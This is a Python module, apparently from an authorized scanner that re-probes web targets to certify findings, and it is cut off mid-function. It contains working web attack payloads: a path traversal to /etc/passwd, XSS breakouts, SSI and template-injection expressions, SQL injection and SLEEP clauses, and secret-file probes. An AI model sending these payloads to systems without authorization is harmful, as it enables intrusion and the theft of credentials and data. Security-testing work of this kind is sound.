"""runtime_redrive — runner-owned gated HTTP re-drive → signed FACT for the RESPONSE-DERIVED vuln classes
whose deterministic oracle is NOT the predicate oracle that :mod:`live.web_redrive` hardcodes.

It extends the exact, already-reviewed ``web_redrive`` discipline — a gated, DNS-pinned, proxy-free send
(reused verbatim: :func:`web_redrive._gated_web_send`) → the RUNNER (never a tool) crafts the probe → the
existing deterministic oracle judges the FRESH captured bytes → one atomic evidence branch is admitted
against its declared capability → ``certify_admitted(provenance="live_redrive")`` mints a signed,
offline-re-verifiable FACT — to three more MERIDIAN-planted classes:

  * ``path_traversal``   — the ``side_effect`` oracle over a KNOWN file-content signature (``root:x:0:0:``):
                           proof the file was actually READ, not that the path merely reflected.
  * ``xss`` (reflected)  — the ``reflection_context`` oracle: a unique canary that reaches an EXECUTABLE
                           HTML position (a tag name / ``<script>`` / an ``on*`` handler), never inert text.
  * ``exposure``         — the ``predicate`` oracle: a distinctive secret signature (``DB_PASSWORD`` /
                           ``propertySources``) at a fixed framework path (``/.env`` / ``/actuator/env``).
  * ``ssi``              — the ``ssi_evaluation`` oracle (Wave-4.1, CWE-97): a PER-PROBE RANDOM product
                           ``N1*N2`` injected as a Server-Side Include directive pair
                           (``<!--#set var=X value="N1*N2" --><!--#echo var=X -->``) that the server
                           EVALUATED — the product present, the raw directive absent — with a benign
                           no-directive control that lacked it. The RUNNER crafts the directive; a page
                           that merely reflects the directive as an inert comment is the honest boundary
                           (reflected, not evaluated) and does NOT fire. The sound minting path is this
                           computed-product proof, never a bare marker; the shell ``<!--#exec cmd=…-->``
                           command variant is a separate SIDE_EFFECT/OOB path, out of this runner's scope.

Unlike ``web_redrive`` (which probes EVERY web class on one URL), this runs ONLY the CLAIMED class, so a
minted FACT is inherently that class — no sibling cross-attribution. Soundness is inherited unchanged: the
gated send refuses out-of-scope / kill-switched traffic before any byte is sent; a probe that established no
channel is INCONCLUSIVE, never CLEAN ("found nothing ≠ CLEAN"); a body VIGIL could not decode is likewise
INCONCLUSIVE; and the oracle over the target's FRESH bytes — never the LLM's claimed context — decides. All
three branches are response-body/service-response derived and therefore NOT clean-capable.

FATAL-2: every framework-touching import is FUNCTION-LOCAL — importing this module co-loads no offense engine.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable, Optional

# The classes this runner mints as FACTs, each mapped to its ONE registered evidence branch + the oracle
# whose deterministic decision procedure adjudicates it. Named by value (the framework enums are resolved
# function-locally, FATAL-2). Kept in lockstep with docs/capability-matrix/evidence-branches.json.
RUNTIME_FACT_CLASSES = ("path_traversal", "xss", "exposure", "ssi")

_BRANCH_FOR = {
    "path_traversal": "path_traversal.file_signature",
    "xss": "xss.reflected_execution",
    "exposure": "exposure.secret_signature",
    "ssi": "ssi.evaluation",
}

# Candidate query-parameter names synthesised for the point-check classes when the proposed URL does not
# already carry a usable parameter, so the insertion surface EXISTS to be rendered into (mirrors
# web_redrive._candidate_redirect_names). A CLEAN would be bounded to these names — but these branches are
# not clean-capable, so the set only bounds where a FACT is SOUGHT, never a claim of absence.
_PATH_TRAVERSAL_PARAMS = ("file", "path", "filename", "name", "doc", "document", "page", "template",
                          "download", "read", "include", "view")
_XSS_PARAMS = ("q", "query", "search", "s", "ref", "name", "keyword", "term", "message", "comment",
               "title", "redirect")
# Candidate parameter names for the SSI class — where a server-side include tends to be assembled from
# a request value (a document/template/page name). A CLEAN would be bounded to these names, but this
# branch is not clean-capable, so the set only bounds where a FACT is SOUGHT, never a claim of absence.
_SSI_PARAMS = ("doc", "document", "file", "page", "template", "include", "name", "view", "path", "content",
               "tpl", "fragment")
_MAX_CANDIDATE_NAMES = 12

# --- W2: three more HTTP-response-derived FACT arms (SSTI / boolean-blind / time-based) ---------------
# Each is a sibling of :func:`runtime_redrive` (runner-owned gated re-drive → the matching frozen oracle →
# admit()+certify_admitted(provenance="live_redrive")) but is NOT in ``RUNTIME_FACT_CLASSES``, so the engage
# ``_redrive_spec`` seam is UNCHANGED — these arms are reached only from the Strix proof-sink dispatch rail
# (proof/run.py). No new OracleKind: SSTI reuses EVALUATION, boolean reuses BOOLEAN_INFERENCE, timing reuses
# TIMING (all already frozen in _ALL_ORACLES). The registered evidence branch each admits through:
_SSTI_BRANCH = "ssti.evaluation"
_BOOLEAN_BRANCH = "boolean_sqli.sprt_inference"
_TIMING_BRANCH = "time_based_sqli.timing_inference"

# Where each blind/response-derived arm SEEKS a FACT if the proposed URL carries no usable parameter (mirrors
# _XSS_PARAMS). A CLEAN would be bounded to these — but these branches are not clean-capable, so the set only
# bounds where a FACT is sought, never a claim of absence.
_SSTI_PARAMS = ("q", "query", "search", "name", "input", "data", "msg", "message", "comment", "title",
                "tpl", "template", "expr", "eval", "page")
_BOOLEAN_PARAMS = ("id", "q", "query", "search", "name", "user", "uid", "item", "category", "cat", "page",
                   "sort", "order", "filter")
_TIMING_PARAMS = ("id", "q", "query", "search", "name", "user", "uid", "item", "category", "sort", "filter")

# The RUNNER-crafted probe payloads. The RUNNER owns these (never a Strix/LLM value), so a FACT rests on
# VIGIL's OWN injected expression/clause. SSTI: distinctive per-probe products go in ``{n1}``/``{n2}`` (filled
# per probe with a fresh random pair). Boolean: clause FAMILIES (see below) — a true clause that breaks
# out and evaluates TRUE vs a false one that evaluates FALSE, over the same insertion point. Timing:
# (benign, low_sleep, high_sleep, low_ms, high_ms) — a benign value vs two SLEEP doses for the dose-response.
_SSTI_EXPR_TEMPLATES = ("{{{{{n1}*{n2}}}}}", "${{{n1}*{n2}}}", "#{{{n1}*{n2}}}", "{{{n1}*{n2}}}")
# TRUTH-VALUE ATTRIBUTION clause FAMILIES. Each family is (K_T always-TRUE clauses, K_F always-FALSE clauses)
# in ONE injection context: syntactically VARIED (different literals ⇒ DISTINCT requests) but with a FIXED truth
# value, so a page whose body is drawn independently of the input cannot make the responses partition BY TRUTH
# VALUE. The variation stays inside one breakout shape so that if one clause parses on the target they all do
# (a family that mixes breakouts would cost recall, not soundness), and each TRUE clause is LENGTH-MATCHED to
# its FALSE counterpart (they differ in one character) so an endpoint that merely ECHOES the parameter cannot
# produce a length signal that correlates with the truth value — it refutes (a recall cost), never separates.
_BOOLEAN_CLAUSE_FAMILIES = (
    # single-quote string-literal breakout
    (("x' OR '1'='1", "x' OR '7'='7", "x' OR 'ab'='ab", "x' OR 'q9'='q9"),
     ("x' OR '1'='2", "x' OR '7'='8", "x' OR 'ab'='ac", "x' OR 'q9'='q8")),
    # numeric context
    (("1 OR 1=1", "1 OR 7=7", "1 OR 23=23", "1 OR 58=58"),
     ("1 OR 1=2", "1 OR 7=8", "1 OR 23=24", "1 OR 58=59")),
    # double-quote string-literal breakout
    (('x" OR "1"="1', 'x" OR "7"="7', 'x" OR "ab"="ab', 'x" OR "q9"="q9'),
     ('x" OR "1"="2', 'x" OR "7"="8', 'x" OR "ab"="ac', 'x" OR "q9"="q8')),
)
# doses in SECONDS for the SLEEP payloads + the injected milliseconds the timing oracle expects.
_TIMING_LOW_S, _TIMING_HIGH_S = 0.3, 0.6
_TIMING_SLEEP_TEMPLATES = (
    "x' OR SLEEP({s})-- -",                  # MySQL string-literal breakout
    "1 OR SLEEP({s})",                       # MySQL numeric context
    "x'||pg_sleep({s})--",                   # PostgreSQL
)
_STAT_MAX_PARAMS = 4     # blind/statistical arms are expensive — probe at most this many insertion points

# Fixed framework/CMS paths + the distinctive signature each leaks, for the exposure class. Each signature is
# specific enough that its presence is the proof (the predicate oracle over the response body); a 404 or a
# signature-less body does not fire (PathProbeCheck returns None on 404 — nothing to adjudicate).
_EXPOSURE_PROBES = (
    ("/.env", "DB_PASSWORD="),                 # value form (key=value), not the bare key a JS bundle names
    ("/actuator/env", "spring.datasource"),    # a Spring config property, not merely "propertySources"
    ("/.git/config", "[core]"),
)


@dataclass
class RuntimeRedriveResult:
    url: str
    bug_class: str
    facts: list = field(default_factory=list)          # AdapterResult (is_fact), signed
    leads: list = field(default_factory=list)          # AdapterResult (channel-confirmed non-fact)
    inconclusive: list = field(default_factory=list)   # (bug_class, item) — no channel / unreadable body
    admissions: list = field(default_factory=list)     # (branch, verdict, reason) — the audit trail
    branch_verdicts: dict = field(default_factory=dict)  # bug_class -> {branch: verdict}
    contexts: dict = field(default_factory=dict)       # finding_ref -> oracle_context (offline re-verify)
    surfaces: dict = field(default_factory=dict)       # bug_class -> set(surface actually EXAMINED)
    refused: bool = False
    notes: list = field(default_factory=list)

    @property
    def n_facts(self) -> int:
        return len(self.facts)

    def family_verdict(self, bug_class: str) -> str:
        """The conservative composition over every branch of ``bug_class`` (see verdict.compose)."""
        from .verdict import compose  # noqa: PLC0415
        verdicts = list(self.branch_verdicts.get(bug_class, {}).values())
        if not verdicts:
            return "INCONCLUSIVE"
        return compose(verdicts).value


def _candidate_query_names(url: str, base_names: "tuple[str, ...]") -> "list[str]":
    """Query-parameter names to probe: the names the URL already carries FIRST (so the endpoint's real
    parameter is exercised), then the well-known set for breadth, de-duped case-insensitively and capped.
    Purely lexical — no network."""
    from urllib.parse import parse_qsl, urlsplit  # noqa: PLC0415
    names: "list[str]" = []
    seen: "set[str]" = set()
    try:
        for k, _v in parse_qsl(urlsplit(url).query, keep_blank_values=True):
            low = k.lower()
            if k and low not in seen:
                names.append(k)
                seen.add(low)
    except Exception:  # noqa: BLE001 — a malformed URL simply contributes no grounded names
        pass
    for n in base_names:
        if n.lower() not in seen:
            names.append(n)
            seen.add(n.lower())
    return names[:_MAX_CANDIDATE_NAMES]


def _url_with_param(url: str, name: str, value: str = "x") -> str:
    """``url`` guaranteed to carry a ``name`` query parameter (append if absent). Lexical only."""
    from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit  # noqa: PLC0415
    sp = urlsplit(url)
    pairs = parse_qsl(sp.query, keep_blank_values=True)
    if any(k.lower() == name.lower() for k, _ in pairs):
        return url
    pairs.append((name, value))
    return urlunsplit((sp.scheme, sp.netloc, sp.path, urlencode(pairs), sp.fragment))


def runtime_redrive(url: str, *, slug: str, engagement_slug: str, signers: "list[tuple[str, str]]",
                    claimed_class: str, timeout: float = 8.0) -> RuntimeRedriveResult:
    """Re-drive ``url`` for the single CLAIMED response-derived class through a gated send + the matching
    deterministic oracle, and mint a signed FACT ONLY when the oracle confirms CAUSATION (not mere presence)
    over VIGIL's OWN live capture:

      * path_traversal — a benign CONTROL request (a non-traversal file value) must NOT already contain the
        file-content signature; only when the signature appears under the TRAVERSAL payload but not the
        control is it attributable to a file read (a docs page that merely prints ``root:x:0:0:`` is refused).
      * xss (reflected) — the reflection oracle must report the ``html_tag`` context (the canary became a live
        element); mere presence inside a ``<script>`` string literal or a ``<noscript>`` block is NOT accepted.
      * exposure — a random CONTROL path must NOT return the signature (a 200 soft-404 / catch-all that serves
        the signature everywhere is refused); the signature is value-shaped so a JS bundle naming the key does
        not match.

    A probe that established no channel is INCONCLUSIVE (never CLEAN). Returns a :class:`RuntimeRedriveResult`.
    Never raises (a probe error is recorded and what held is returned)."""
    import hashlib  # noqa: PLC0415 — stdlib; deterministic control tokens (no rng, determinism invariant)

    import secrets  # noqa: PLC0415 — per-probe UNPREDICTABLE product so the value cannot pre-exist (not rng
    #                                  in learning/reward math; the oracle re-fires deterministically offline)

    from framework.v2.scanner.checks import (  # noqa: PLC0415
        ContentSignatureCheck, MarkerReflectionCheck, PathProbeCheck)
    from framework.v2.scanner.insertion import HttpRequest, InsertionKind, RequestTemplate  # noqa: PLC0415
    from framework.v2.verify.adapter import FindingContext  # noqa: PLC0415
    from framework.v2.verify.oracles import (  # noqa: PLC0415
        predicate_oracle, reflection_context_oracle, side_effect_oracle, ssi_evaluation_oracle)
    from framework.v2.verify.reachability_cloud import _authorize  # noqa: PLC0415 — the URL-shaped gate
    from framework.v2.verify.verifier import normalize_bug_class  # noqa: PLC0415

    from ..oracle_adapter import certify_admitted  # noqa: PLC0415 (FATAL-2: function-local)
    from .verdict import Verdict, admit, branch_ids, compose  # noqa: PLC0415
    from .web_redrive import _gated_web_send  # noqa: PLC0415 — the reviewed gated, DNS-pinned, no-proxy send

    bug_class = normalize_bug_class(claimed_class)
    res = RuntimeRedriveResult(url=url, bug_class=bug_class)
    if bug_class not in RUNTIME_FACT_CLASSES:
        res.notes.append(f"{bug_class!r} is not a runtime-redrive class")
        return res
    branch = _BRANCH_FOR[bug_class]
    if branch not in branch_ids():
        res.notes.append(f"branch {branch!r} is not registered — cannot admit (fail-closed)")
        return res

    refusal = _authorize(url, slug)
    if refusal is not None:
        res.refused = True
        res.notes.append(f"refused before any traffic: {refusal}")
        return res

    send, state = _gated_web_send(slug, timeout=timeout)
    nonce = hashlib.sha256(url.encode("utf-8")).hexdigest()[:12]

    def _body(resp: Any) -> str:
        return str(resp.get("body", "")) if isinstance(resp, dict) else str(resp)

    def _admit(context: dict, item: str, surface: str, *, fired: bool, conclusive: bool,
               body_unreadable: bool) -> None:
        res.surfaces.setdefault(bug_class, set()).add(surface)
        observed = {"channel_established": True, "body_semantically_available": not body_unreadable,
                    "gate_authorized": True}
        finding = {"check_id": f"rt:{bug_class}:{item}#{branch}", "bug_class": bug_class,
                   "insertion_point": item, "oracle_context": context}
        admitted = admit(branch, fired=fired, conclusive=conclusive, observed=observed)
        res.admissions.append((branch, admitted.verdict.value, admitted.reason))
        bm = res.branch_verdicts.setdefault(bug_class, {})
        prior = bm.get(branch)
        bm[branch] = compose([prior, admitted.verdict.value]).value if prior else admitted.verdict.value
        r = certify_admitted(finding, admitted, engagement_slug=engagement_slug, signers=signers,
                             provenance="live_redrive")
        res.contexts[r.finding_ref] = context
        if r.is_fact:
            res.facts.append(r)
        elif admitted.verdict is Verdict.INCONCLUSIVE:
            res.inconclusive.append((bug_class, f"{item}#{branch}"))
        else:
            res.leads.append(r)

    try:
        if bug_class == "path_traversal":
            sig = "root:x:0:0:"
            chk = ContentSignatureCheck(id="path-traversal", bug_class="path_traversal",
                                        payload="../../../../etc/passwd", signature=sig)
            control_value = f"vigilctl{nonce}.txt"    # a benign, non-traversal file value (baseline)
            for name in _candidate_query_names(url, _PATH_TRAVERSAL_PARAMS):
                probe_url = _url_with_param(url, name)
                tmpl = RequestTemplate(HttpRequest(method="GET", url=probe_url))
                point = next((p for p in tmpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
                              if p.name.lower() == name.lower()), None)
                if point is None:
                    continue
                # CONTROL first: if the benign response already carries the file signature, the page prints it
                # regardless of input — NOT attributable to a traversal → refuse (BLOCK-1 fix).
                before = state["channels"]
                try:
                    control = send(tmpl.render(point, control_value))
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"path_traversal control error [{name}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before:
                    res.inconclusive.append((bug_class, f"{probe_url}#control"))
                    continue
                if sig in _body(control):
                    res.notes.append(f"path_traversal: signature present in the benign control on {name!r} — "
                                     "not attributable to a traversal → LEAD")
                    continue
                # TREATMENT: the traversal payload. The signature is now attributable to the file read.
                before2, before_bodies = state["channels"], state["body_unavailable"]
                ctx_obj = chk.probe(tmpl, point, send)
                if state["channels"] <= before2:
                    res.inconclusive.append((bug_class, f"{probe_url}#{point.id}"))
                    continue
                if ctx_obj is None:
                    continue
                context = ctx_obj.to_verifier_context()
                signal = side_effect_oracle(context.get("marker", ""), context.get("observed_sink", ""))
                _admit(context, f"{probe_url}#{point.id}", f"query:{name}",
                       fired=signal.fired, conclusive=signal.conclusive,
                       body_unreadable=state["body_unavailable"] > before_bodies)

        elif bug_class == "xss":
            chk = MarkerReflectionCheck(id="reflected-xss", bug_class="xss",
                                        payload_template="\"'><x{marker}>")
            for name in _candidate_query_names(url, _XSS_PARAMS):
                probe_url = _url_with_param(url, name)
                tmpl = RequestTemplate(HttpRequest(method="GET", url=probe_url))
                point = next((p for p in tmpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
                              if p.name.lower() == name.lower()), None)
                if point is None:
                    continue
                before, before_bodies = state["channels"], state["body_unavailable"]
                try:
                    ctx_obj = chk.probe(tmpl, point, send)
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"xss probe error [{name}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before:
                    res.inconclusive.append((bug_class, f"{probe_url}#{point.id}"))
                    continue
                if ctx_obj is None:
                    continue
                context = ctx_obj.to_verifier_context()
                signal = reflection_context_oracle(context.get("marker", ""), context.get("observed_sink", ""))
                # SOUND breakout ONLY: the canary must have become a live ELEMENT (html_tag). Mere presence
                # inside a <script> string literal or a <noscript> block is NOT a proven breakout (BLOCK-3 fix).
                ctxkind = (getattr(signal, "observed", {}) or {}).get("context")
                accepted = bool(signal.fired) and ctxkind == "html_tag"
                _admit(context, f"{probe_url}#{point.id}", f"query:{name}",
                       fired=accepted, conclusive=(signal.conclusive if accepted else False),
                       body_unreadable=state["body_unavailable"] > before_bodies)

        elif bug_class == "ssi":
            # SSI (CWE-97): the RUNNER crafts a Server-Side Include directive pair carrying a PER-PROBE
            # RANDOM product; a fire needs the product PRESENT, the raw directive ABSENT (not merely
            # reflected), AND a benign no-directive control that LACKS the product — the computed-product
            # evaluation proof (ssi_evaluation_oracle). A page that echoes the directive verbatim as an
            # inert comment is the honest boundary and does not fire.
            for name in _candidate_query_names(url, _SSI_PARAMS):
                probe_url = _url_with_param(url, name)
                tmpl = RequestTemplate(HttpRequest(method="GET", url=probe_url))
                point = next((p for p in tmpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
                              if p.name.lower() == name.lower()), None)
                if point is None:
                    continue
                # CONTROL first: a benign, non-directive value. Its body must NOT carry the (random) product.
                before, before_bodies = state["channels"], state["body_unavailable"]
                try:
                    control = send(tmpl.render(point, f"vigilbenign{nonce}"))
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"ssi control error [{name}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before:
                    res.inconclusive.append((bug_class, f"{probe_url}#control"))
                    continue
                control_body = _body_text(control)
                # TREATMENT: a fresh, UNPREDICTABLE product injected as an SSI set+echo directive pair. The
                # var name is nonce-scoped so the directive is well-formed and self-contained.
                n1 = secrets.randbelow(90000) + 10000
                n2 = secrets.randbelow(90000) + 10000
                product = str(n1 * n2)
                var = f"vc{nonce}"
                directive = f'<!--#set var="{var}" value="{n1}*{n2}" --><!--#echo var="{var}" -->'
                before2, before_bodies2 = state["channels"], state["body_unavailable"]
                try:
                    probe = send(tmpl.render(point, directive))
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"ssi probe error [{name}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before2:
                    res.inconclusive.append((bug_class, f"{probe_url}#{point.id}"))
                    continue
                fc = FindingContext.from_ssi(directive, product, _body(probe),
                                             control_body=control_body, bug_class="ssi")
                context = fc.to_verifier_context()
                signal = ssi_evaluation_oracle(context.get("ssi_raw", ""), context.get("ssi_expected", ""),
                                               context.get("ssi_observed", ""), context.get("ssi_control"))
                _admit(context, f"{probe_url}#{point.id}", f"query:{name}",
                       fired=signal.fired, conclusive=signal.conclusive,
                       body_unreadable=state["body_unavailable"] > before_bodies2)

        else:  # exposure — a request-level fixed-path probe with a random-path (soft-404) control
            tmpl = RequestTemplate(HttpRequest(method="GET", url=url))
            rand_path = f"/vigil-{nonce}-notfound"
            for probe_path, signature in _EXPOSURE_PROBES:
                # CONTROL: a definitely-nonexistent path. PathProbeCheck returns a context only for a non-404
                # response whose body carries the signature, so a non-None control means the signature is
                # served EVERYWHERE (a 200 soft-404 / catch-all) — refuse (BLOCK-2 fix).
                ctl = PathProbeCheck(id=f"exposure-ctl{probe_path}", bug_class="exposure",
                                     probe_path=rand_path, signature=signature)
                try:
                    control_ctx = ctl.probe(tmpl, send)
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"exposure control error [{probe_path}]: {type(e).__name__}: {e}")
                    continue
                if control_ctx is not None:
                    res.notes.append(f"exposure: signature {signature!r} also served at a random path "
                                     "(soft-404 / catch-all) — not path-specific → LEAD")
                    continue
                chk = PathProbeCheck(id=f"exposure{probe_path}", bug_class="exposure",
                                     probe_path=probe_path, signature=signature)
                before, before_bodies = state["channels"], state["body_unavailable"]
                try:
                    ctx_obj = chk.probe(tmpl, send)
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"exposure probe error [{probe_path}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before:
                    res.inconclusive.append((bug_class, f"{url}#{probe_path}"))
                    continue
                if ctx_obj is None:
                    continue
                context = ctx_obj.to_verifier_context()
                signal = predicate_oracle(context.get("observed_evidence", {}), context.get("predicate", {}))
                _admit(context, f"{url}#{probe_path}", f"path:{probe_path}",
                       fired=signal.fired, conclusive=signal.conclusive,
                       body_unreadable=state["body_unavailable"] > before_bodies)
    except Exception as e:  # noqa: BLE001 — a probe error never fabricates a FACT; record + return what held
        res.notes.append(f"runtime_redrive error: {type(e).__name__}: {e}")
    return res


# =====================================================================================================
# W2 — shared machinery + the three new response-derived FACT arms (SSTI / boolean-blind / time-based).
# =====================================================================================================


def _candidate_names_hint(url: str, base_names: "tuple[str, ...]", hint: "str | None",
                          max_names: int) -> "list[str]":
    """The candidate query-parameter names to probe: the finding's OWN declared ``hint`` param FIRST (so the
    endpoint's real parameter is exercised), then the URL's existing params, then the well-known set —
    de-duped case-insensitively and capped to ``max_names``. Purely lexical (no network)."""
    names = _candidate_query_names(url, base_names)
    if hint and hint.strip():
        h = hint.strip()
        names = [h] + [n for n in names if n.lower() != h.lower()]
    return names[:max_names]


def _admit_one(res: "RuntimeRedriveResult", *, branch: str, bug_class: str, engagement_slug: str,
               signers: "list[tuple[str, str]]", context: dict, item: str, surface: str,
               fired: bool, conclusive: bool, body_unreadable: bool) -> Any:
    """Admit ONE branch outcome against its declared capability and, on a FACT-capable fire, mint a signed,
    offline-re-verifiable certificate over VIGIL's OWN reproduced context (provenance=live_redrive). A
    standalone twin of the ``_admit`` closure in :func:`runtime_redrive`, shared by the three W2 arms so the
    admission + certification discipline is identical. Returns the ``AdapterResult`` (``.is_fact``)."""
    from ..oracle_adapter import certify_admitted  # noqa: PLC0415 (FATAL-2: function-local)
    from .verdict import Verdict, admit, compose  # noqa: PLC0415

    res.surfaces.setdefault(bug_class, set()).add(surface)
    observed = {"channel_established": True, "body_semantically_available": not body_unreadable,
                "gate_authorized": True}
    finding = {"check_id": f"rt:{bug_class}:{item}#{branch}", "bug_class": bug_class,
               "insertion_point": item, "oracle_context": context}
    admitted = admit(branch, fired=fired, conclusive=conclusive, observed=observed)
    res.admissions.append((branch, admitted.verdict.value, admitted.reason))
    bm = res.branch_verdicts.setdefault(bug_class, {})
    prior = bm.get(branch)
    bm[branch] = compose([prior, admitted.verdict.value]).value if prior else admitted.verdict.value
    r = certify_admitted(finding, admitted, engagement_slug=engagement_slug, signers=signers,
                         provenance="live_redrive")
    res.contexts[r.finding_ref] = context
    if r.is_fact:
        res.facts.append(r)
    elif admitted.verdict is Verdict.INCONCLUSIVE:
        res.inconclusive.append((bug_class, f"{item}#{branch}"))
    else:
        res.leads.append(r)
    return r


def _stat_setup(url: str, slug: str, bug_class: str, branch: str, timeout: float):
    """Shared preamble for the three W2 arms: build the result, verify the branch is REGISTERED (fail-closed),
    run the URL-shaped charter gate BEFORE any traffic, and open the reviewed gated send. Returns
    ``(res, send, state)`` on success, or ``(res, None, None)`` when the arm must return early (unregistered
    branch / gate refusal)."""
    from framework.v2.verify.reachability_cloud import _authorize  # noqa: PLC0415 — the URL-shaped gate
    from .verdict import branch_ids  # noqa: PLC0415
    from .web_redrive import _gated_web_send  # noqa: PLC0415 — the reviewed gated, DNS-pinned, no-proxy send

    res = RuntimeRedriveResult(url=url, bug_class=bug_class)
    if branch not in branch_ids():
        res.notes.append(f"branch {branch!r} is not registered — cannot admit (fail-closed)")
        return res, None, None
    refusal = _authorize(url, slug)
    if refusal is not None:
        res.refused = True
        res.notes.append(f"refused before any traffic: {refusal}")
        return res, None, None
    send, state = _gated_web_send(slug, timeout=timeout)
    return res, send, state


def ssti_redrive(url: str, *, slug: str, engagement_slug: str, signers: "list[tuple[str, str]]",
                 param: "str | None" = None, timeout: float = 8.0) -> "RuntimeRedriveResult":
    """Re-drive ``url`` for SERVER-SIDE TEMPLATE / EXPRESSION-LANGUAGE injection and mint a signed FACT ONLY
    when the deterministic ``evaluation_oracle`` confirms the server EVALUATED a runner-injected expression:
    a PER-PROBE random product ``N1*N2`` present in the FRESH response body, the raw expression ABSENT
    (reflected-verbatim ⇒ a conclusive clean, not a fire), and a benign no-expression CONTROL lacking it.

    FP boundary (all → LEAD): a raw expression that survives unevaluated (reflected==sent), a product present
    in the benign control, and an arithmetic coincidence (guarded by the unique per-probe product + raw-absent
    check). Never raises."""
    import secrets  # noqa: PLC0415 — per-probe UNPREDICTABLE product (not learning/reward rng)

    from framework.v2.scanner.insertion import HttpRequest, InsertionKind, RequestTemplate  # noqa: PLC0415
    from framework.v2.verify.adapter import FindingContext  # noqa: PLC0415
    from framework.v2.verify.oracles import evaluation_oracle  # noqa: PLC0415

    bug_class = "ssti"
    res, send, state = _stat_setup(url, slug, bug_class, _SSTI_BRANCH, timeout)
    if send is None:
        return res
    nonce = _sha(url)
    try:
        for name in _candidate_names_hint(url, _SSTI_PARAMS, param, _MAX_CANDIDATE_NAMES):
            probe_url = _url_with_param(url, name)
            tmpl = RequestTemplate(HttpRequest(method="GET", url=probe_url))
            point = next((p for p in tmpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
                          if p.name.lower() == name.lower()), None)
            if point is None:
                continue
            # CONTROL first: a benign, non-expression value. Its body must NOT already carry the product.
            before = state["channels"]
            try:
                control = send(tmpl.render(point, f"vigilbenign{nonce}"))
            except Exception as e:  # noqa: BLE001
                res.notes.append(f"ssti control error [{name}]: {type(e).__name__}: {e}")
                continue
            if state["channels"] <= before:
                res.inconclusive.append((bug_class, f"{probe_url}#control"))
                continue
            control_body = _body_text(control)
            fired_here = False
            for tpl in _SSTI_EXPR_TEMPLATES:
                n1 = secrets.randbelow(90000) + 10000
                n2 = secrets.randbelow(90000) + 10000
                product = str(n1 * n2)
                payload = tpl.format(n1=n1, n2=n2)
                before2, before_bodies2 = state["channels"], state["body_unavailable"]
                try:
                    probe = send(tmpl.render(point, payload))
                except Exception as e:  # noqa: BLE001
                    res.notes.append(f"ssti probe error [{name}]: {type(e).__name__}: {e}")
                    continue
                if state["channels"] <= before2:
                    res.inconclusive.append((bug_class, f"{probe_url}#{point.id}"))
                    continue
                fc = FindingContext.from_evaluation(payload, product, _body_text(probe),
                                                    control_body=control_body, bug_class="ssti")
                context = fc.to_verifier_context()
                signal = evaluation_oracle(context.get("eval_raw", ""), context.get("eval_expected", ""),
                                           context.get("eval_observed", ""), context.get("eval_control"))
                r = _admit_one(res, branch=_SSTI_BRANCH, bug_class=bug_class,
                               engagement_slug=engagement_slug, signers=signers, context=context,
                               item=f"{probe_url}#{point.id}", surface=f"query:{name}",
                               fired=signal.fired, conclusive=signal.conclusive,
                               body_unreadable=state["body_unavailable"] > before_bodies2)
                if r.is_fact:
                    fired_here = True
                    break
            if fired_here:
                break     # one FACT is decisive for a re-drive — stop (bounded work)
    except Exception as e:  # noqa: BLE001 — a probe error never fabricates a FACT; record + return what held
        res.notes.append(f"ssti_redrive error: {type(e).__name__}: {e}")
    return res


def boolean_redrive(url: str, *, slug: str, engagement_slug: str, signers: "list[tuple[str, str]]",
                    param: "str | None" = None, timeout: float = 8.0, n_max: int = 14) -> "RuntimeRedriveResult":
    """Re-drive ``url`` for BOOLEAN-BLIND injection and mint a signed FACT ONLY when the deterministic
    ``boolean_inference_oracle`` reaches its SPRT confirm boundary over N runner-crafted TRUTH-VALUE
    ATTRIBUTION rounds. Reuses the reviewed ``BooleanInferenceCheck`` discipline over VIGIL's OWN gated send:
    each round sends 4 DISTINCT always-TRUE clauses and 4 DISTINCT always-FALSE clauses (one
    ``_BOOLEAN_CLAUSE_FAMILIES`` entry), each twice byte-identically, and signals only when the response is a
    FUNCTION of the injected boolean's TRUTH VALUE — one TRUE cluster, one FALSE cluster, disjoint.

    FP boundary (all → LEAD): an endpoint whose response varies INDEPENDENTLY of the input — coarse
    (low-cardinality), SKEWED, or high-entropy — cannot make 8 true-side and 8 false-side draws split cleanly
    by truth value (``<= 3.1e-5`` per round, vs the SPRT's ``p0 = 0.1``), so it refutes; a single flip without
    SPRT significance ⇒ inconclusive. A legitimately noisy-but-vulnerable page is a LEAD (a recall cost, the
    safe direction). The oracle docstring states the irreducible residual (a per-URL-caching endpoint). Never
    raises."""
    from framework.v2.scanner.checks import BooleanInferenceCheck  # noqa: PLC0415
    from framework.v2.scanner.insertion import HttpRequest, InsertionKind, RequestTemplate  # noqa: PLC0415
    from framework.v2.verify.oracles import boolean_inference_oracle  # noqa: PLC0415

    bug_class = "boolean_sqli"
    res, send, state = _stat_setup(url, slug, bug_class, _BOOLEAN_BRANCH, timeout)
    if send is None:
        return res
    # A targeted re-drive of a KNOWN param probes ONLY that param (mirrors the errsig arm — bounded work on
    # the expensive SPRT arm); a captureless finding with no declared param falls back to the candidate set.
    max_params = 1 if param else _STAT_MAX_PARAMS
    try:
        for name in _candidate_names_hint(url, _BOOLEAN_PARAMS, param, max_params):
            probe_url = _url_with_param(url, name)
            tmpl = RequestTemplate(HttpRequest(method="GET", url=probe_url))
            point = next((p for p in tmpl.insertion_points(kinds=(InsertionKind.QUERY_VALUE,))
                          if p.name.lower() == name.lower()), None)
            if point is None:
                continue
            fired_here = False
            for true_clauses, false_clauses in _BOOLEAN_CLAUSE_FAMILIES:
                chk = BooleanInferenceCheck(id="boolean-redrive", bug_class="boolean_sqli",
                                            true_clauses=true_clauses, false_clauses=false_clauses,
